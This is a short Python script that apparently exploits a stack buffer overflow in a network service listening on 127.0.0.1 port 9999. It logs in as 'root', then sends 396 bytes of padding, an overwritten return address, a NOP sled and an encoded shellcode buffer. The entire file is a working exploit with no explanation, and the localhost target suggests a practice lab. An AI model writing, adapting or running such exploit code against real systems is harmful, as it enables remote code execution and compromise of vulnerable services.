import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

offset = 396
eip = b"\xf0\xce\xff\xff"
nop = b"\x90" * 8

buf =  b""
buf += b"\xbe\xc4\xf2\xab\xda\xda\xd8\xd9\x74\x24\xf4\x5d"
buf += b"\x2b\xc9\xb1\x12\x31\x75\x12\x83\xed\xfc\x03\xb1"
buf += b"\xfc\x49\x2f\x08\xda\x79\x33\x39\x9f\xd6\xde\xbf"
buf += b"\x96\x38\xae\xd9\x65\x3a\x5c\x7c\xc6\x04\xae\xfe"
buf += b"\x6f\x02\xc9\x96\xaf\x5c\xea\xe5\x58\x9f\xed\xf8"
buf += b"\xc4\x16\x0c\x4a\x92\x78\x9e\xf9\xe8\x7a\xa9\x1c"
buf += b"\xc3\xfd\xfb\xb6\xb2\xd2\x88\x2e\x23\x02\x40\xcc"
buf += b"\xda\xd5\x7d\x42\x4e\x6f\x60\xd2\x7b\xa2\xe3"

payload = (b"A" * offset + eip + nop + buf)

print("Exploit ... ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.recv(1024)
    
s.send(b'root\r\n')
s.recv(1024)
s.send(payload + b'\r\n')
s.send(b'QUIT\r\n')
s.close()

